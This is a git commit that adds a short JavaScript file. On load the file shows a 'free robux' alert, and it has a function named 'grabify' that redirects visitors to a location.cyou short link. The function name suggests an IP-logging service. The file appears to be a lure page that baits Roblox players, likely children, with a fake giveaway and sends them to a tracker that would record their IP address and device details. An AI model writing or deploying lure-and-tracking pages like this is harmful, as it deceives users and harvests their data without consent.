16e9c61e56e346d58b211dd478ce70659700af2e
abdulliwulli <rudenkokonstantin69420@gmail.com>
2024-10-10 10:51:28 -0500

    Add files via upload

---
+++ script.js
@@ -0,0 +1,11 @@
+window.onload = function() {
+    alert("Look who's getting free robux today! 😀😀");
+};
+function redirect() {
+    // Added https:// for full URL
+    window.location.href = "https://www.youtube.com";
+}
+
+const grabify = () => {
+    window.location.href = "https://location.cyou/HTOBK0";
+}
